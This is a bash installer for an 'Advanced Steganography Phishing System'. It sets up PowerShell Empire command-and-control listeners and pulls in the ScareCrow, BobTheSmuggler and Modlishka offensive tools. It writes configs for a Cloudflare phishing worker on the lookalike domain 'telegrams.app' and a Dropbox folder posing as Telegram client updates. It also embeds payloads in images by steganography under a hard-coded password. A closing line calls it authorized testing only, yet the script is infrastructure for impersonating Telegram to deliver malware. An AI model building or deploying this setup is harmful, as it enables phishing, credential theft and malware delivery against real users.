#!/bin/bash
# Advanced Steganography Phishing System - Complete Setup
# Automated installer for all dependencies and tools

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Configuration
BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
TOOLS_DIR="${BASE_DIR}/tools"
LOGS_DIR="${BASE_DIR}/logs"
VENV_DIR="${BASE_DIR}/venv"

# Functions
log() {
    echo -e "${BLUE}[$(date +'%H:%M:%S')]${NC} $1"
}

success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

header() {
    echo -e "\n${PURPLE}═══════════════════════════════════════${NC}"
    echo -e "${PURPLE}$1${NC}"
    echo -e "${PURPLE}═══════════════════════════════════════${NC}\n"
}

check_root() {
    if [[ $EUID -eq 0 ]]; then
        warning "This script should not be run as root for security reasons"
        read -p "Continue anyway? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

check_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        log "Detected Linux system"
        if command -v apt &> /dev/null; then
            PACKAGE_MANAGER="apt"
        elif command -v yum &> /dev/null; then
            PACKAGE_MANAGER="yum"  
        elif command -v pacman &> /dev/null; then
            PACKAGE_MANAGER="pacman"
        else
            error "Unsupported package manager"
            exit 1
        fi
    else
        error "Unsupported operating system: $OSTYPE"
        exit 1
    fi
}

install_system_deps() {
    header "Installing System Dependencies"
    
    log "Updating package lists..."
    case $PACKAGE_MANAGER in
        apt)
            sudo apt update
            sudo apt install -y \
                python3 \
                python3-pip \
                python3-venv \
                git \
                curl \
                wget \
                steghide \
                build-essential \
                nodejs \
                npm \
                golang-go \
                tmux \
                jq
            ;;
        yum)
            sudo yum update -y
            sudo yum install -y \
                python3 \
                python3-pip \
                git \
                curl \
                wget \
                steghide \
                gcc \
                nodejs \
                npm \
                golang \
                tmux \
                jq
            ;;
        pacman)
            sudo pacman -Syu --noconfirm
            sudo pacman -S --noconfirm \
                python3 \
                python-pip \
                git \
                curl \
                wget \
                steghide \
                base-devel \
                nodejs \
                npm \
                go \
                tmux \
                jq
            ;;
    esac
    
    success "System dependencies installed"
}

setup_python_env() {
    header "Setting up Python Environment"
    
    log "Creating virtual environment..."
    python3 -m venv "$VENV_DIR"
    
    log "Activating virtual environment..."
    source "$VENV_DIR/bin/activate"
    
    log "Upgrading pip..."
    pip install --upgrade pip
    
    log "Installing Python dependencies..."
    if [[ -f "${BASE_DIR}/requirements.txt" ]]; then
        pip install -r "${BASE_DIR}/requirements.txt"
    else
        # Install essential packages
        pip install \
            typer \
            rich \
            pyyaml \
            requests \
            pillow \
            numpy \
            cryptography \
            dropbox
    fi
    
    success "Python environment configured"
}

install_wrangler() {
    header "Installing Cloudflare Wrangler"
    
    if command -v wrangler &> /dev/null; then
        log "Wrangler already installed: $(wrangler --version)"
        return
    fi
    
    log "Installing Wrangler CLI..."
    npm install -g wrangler
    
    success "Wrangler CLI installed"
}

setup_directories() {
    header "Setting up Directory Structure"
    
    directories=(
        "configs/empire"
        "configs/cloudflare" 
        "configs/stego"
        "modules/common"
        "modules/empire"
        "modules/stego"
        "scripts"
        "docs"
        "tests"
        "state"
        "logs"
        "large-stego-images"
        "stego-output"
    )
    
    for dir in "${directories[@]}"; do
        mkdir -p "${BASE_DIR}/${dir}"
        log "Created directory: $dir"
    done
    
    # Create .gitkeep files for empty directories
    touch "${BASE_DIR}/state/.gitkeep"
    touch "${BASE_DIR}/logs/.gitkeep"
    
    success "Directory structure created"
}

create_configs() {
    header "Creating Configuration Files"
    
    # Global config
    cat > "${BASE_DIR}/configs/global.yml" << 'EOF'
# Advanced Steganography Phishing System - Global Configuration

tools:
  empire:
    enabled: true
    path: ./tools/empire
    port: 1337
    host: 127.0.0.1
  
  starkiller:
    enabled: true
    path: ./tools/starkiller
    port: 9090
    
  scarecrow:
    enabled: true
    path: ./tools/scarecrow
    binary: ScareCrow
    
  steganography:
    enabled: true
    password: telegram2025research
    carrier_dir: ./large-stego-images
    output_dir: ./stego-output

cloudflare:
  domain: telegrams.app
  workers_dir: ./workers

safety:
  dry_run_default: true
  require_confirmation: true
  log_all_commands: true
EOF
    
    # Empire config template
    cat > "${BASE_DIR}/configs/empire/empire-config.yml" << 'EOF'
# Empire C2 Configuration Template
# Copy this to empire-config.local.yml and customize

listeners:
  - name: http_listener
    host: 0.0.0.0
    port: 8080
    protocol: http
    
  - name: https_listener  
    host: 0.0.0.0
    port: 8443
    protocol: https
    cert_path: ./certs/certificate.crt
    key_path: ./certs/private.key

stagers:
  default_delay: 5
  default_jitter: 0.0
  kill_date: ""
  working_hours: ""
EOF
    
    # Cloudflare wrangler template
    cat > "${BASE_DIR}/configs/cloudflare/wrangler.toml.template" << 'EOF'
name = "telegram-phishing-worker"
main = "src/index.js"
compatibility_date = "2024-10-01"

# Fill in your account details:
# account_id = "YOUR_ACCOUNT_ID"
# zone_id = "YOUR_ZONE_ID"

[env.production]
# route = "telegrams.app/*"

[vars]
DOMAIN = "telegrams.app"
DROPBOX_FOLDER = "/TelegramClientUpdates/LargeImages/"
EOF

    # Steganography config
    cat > "${BASE_DIR}/configs/stego/stego.yml" << 'EOF'
# Steganography Configuration

default:
  algorithm: lsb
  password: telegram2025research
  compression: 9
  encryption: des

carriers:
  directory: ./large-stego-images
  formats:
    - jpg
    - jpeg
    - png
  min_size_mb: 5

output:
  directory: ./stego-output
  manifest: manifest.json
EOF
    
    success "Configuration files created"
}

copy_tools() {
    header "Copying Security Tools"
    
    # Copy from system locations if they exist
    tools_source_paths=(
        "/home/kali/Empire:/tools/empire"
        "/home/kali/tools/ScareCrow:/tools/scarecrow" 
        "/home/kali/BobTheSmuggler:/tools/bobthesmuggler"
        "/home/kali/Modlishka:/tools/modlishka"
    )
    
    for tool_path in "${tools_source_paths[@]}"; do
        source_path="${tool_path%%:*}"
        dest_path="${BASE_DIR}/${tool_path##*:}"
        
        if [[ -d "$source_path" ]]; then
            log "Copying $(basename $source_path)..."
            cp -r "$source_path"/* "$dest_path/" 2>/dev/null || true
            success "Copied $(basename $source_path)"
        else
            warning "$(basename $source_path) not found at $source_path"
        fi
    done
}

setup_empire() {
    header "Setting up PowerShell Empire"
    
    empire_dir="${TOOLS_DIR}/empire"
    if [[ ! -d "$empire_dir" ]]; then
        log "Cloning PowerShell Empire..."
        git clone https://github.com/BC-SECURITY/Empire.git "$empire_dir"
    fi
    
    if [[ -f "${empire_dir}/setup/install.sh" ]]; then
        log "Installing Empire dependencies..."
        cd "$empire_dir"
        bash setup/install.sh
        cd "$BASE_DIR"
        success "Empire setup completed"
    else
        warning "Empire install script not found"
    fi
}

create_launcher_scripts() {
    header "Creating Launcher Scripts"
    
    # Main launcher script
    cat > "${BASE_DIR}/launch.sh" << 'EOF'
#!/bin/bash
# Advanced Steganography Phishing System Launcher

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
VENV_DIR="${BASE_DIR}/venv"

# Activate virtual environment
if [[ -f "${VENV_DIR}/bin/activate" ]]; then
    source "${VENV_DIR}/bin/activate"
fi

# Launch Python CLI
python3 "${BASE_DIR}/launcher.py" "$@"
EOF
    
    chmod +x "${BASE_DIR}/launch.sh"
    
    # Quick setup verification
    cat > "${BASE_DIR}/verify-setup.sh" << 'EOF'
#!/bin/bash
# Verify system setup

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"

echo "🔍 Verifying Advanced Steganography Phishing System Setup"
echo "========================================================="

# Check Python
if command -v python3 &> /dev/null; then
    echo "✅ Python: $(python3 --version)"
else
    echo "❌ Python not found"
fi

# Check dependencies
if command -v steghide &> /dev/null; then
    echo "✅ Steghide available"
else
    echo "❌ Steghide not found" 
fi

if command -v wrangler &> /dev/null; then
    echo "✅ Wrangler: $(wrangler --version | head -1)"
else
    echo "❌ Wrangler not found"
fi

# Check virtual environment
if [[ -f "${BASE_DIR}/venv/bin/activate" ]]; then
    echo "✅ Python virtual environment ready"
else
    echo "❌ Virtual environment not found"
fi

# Check tools
echo ""
echo "🔧 Security Tools:"
for tool in empire scarecrow bobthesmuggler modlishka; do
    if [[ -d "${BASE_DIR}/tools/${tool}" ]]; then
        echo "✅ ${tool}: Available"
    else
        echo "❌ ${tool}: Not found"
    fi
done

echo ""
echo "🚀 Next steps:"
echo "• Run: ./launch.sh doctor"
echo "• Run: ./launch.sh tools list" 
echo "• Run: ./launch.sh stego encode --help"
EOF
    
    chmod +x "${BASE_DIR}/verify-setup.sh"
    
    success "Launcher scripts created"
}

finalize_setup() {
    header "Finalizing Setup"
    
    # Make launcher executable
    chmod +x "${BASE_DIR}/launcher.py"
    
    # Create desktop launcher (optional)
    if command -v desktop-file-install &> /dev/null; then
        cat > "${BASE_DIR}/advanced-steganography-phishing.desktop" << EOF
[Desktop Entry]
Name=Advanced Steganography Phishing System
Comment=Complete toolkit launcher
Exec=${BASE_DIR}/launch.sh
Icon=applications-security
Terminal=true
Type=Application
Categories=Security;Development;
EOF
        log "Desktop launcher created (optional)"
    fi
    
    # Set proper permissions
    find "${BASE_DIR}/scripts" -name "*.sh" -exec chmod +x {} \; 2>/dev/null || true
    
    success "Setup finalized"
}

main() {
    header "🎯 Advanced Steganography Phishing System Setup"
    
    log "Starting complete system installation..."
    
    # Confirmation
    echo "This will install and configure:"
    echo "• System dependencies (Python, Node.js, Go, steghide)"
    echo "• Python virtual environment with required packages"
    echo "• Cloudflare Wrangler CLI"
    echo "• PowerShell Empire C2 framework"
    echo "• Security tools and configurations"
    echo ""
    
    read -p "Continue with installation? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        log "Installation cancelled"
        exit 0
    fi
    
    # Run installation steps
    check_root
    check_os
    install_system_deps
    setup_directories  
    setup_python_env
    install_wrangler
    create_configs
    copy_tools
    setup_empire
    create_launcher_scripts
    finalize_setup
    
    # Final summary
    header "🎉 Installation Complete!"
    
    success "Advanced Steganography Phishing System is ready!"
    echo ""
    echo "📋 Quick Start Commands:"
    echo "• ./verify-setup.sh          - Verify installation"
    echo "• ./launch.sh doctor         - System diagnostics"
    echo "• ./launch.sh tools list     - Available tools"
    echo "• ./launch.sh --help         - Full command list"
    echo ""
    echo "🔧 Next Steps:"
    echo "1. Review configs/global.yml for customization"
    echo "2. Configure Cloudflare Workers (set API tokens)"
    echo "3. Generate steganography images: ./launch.sh stego batch"
    echo "4. Start C2 infrastructure: ./launch.sh c2 configure"
    echo ""
    echo "📁 Repository: https://github.com/EnkiJJK/advanced-steganography-phishing"
    echo ""
    warning "Remember: This system is for authorized testing only"
}

# Execute main function
main "$@"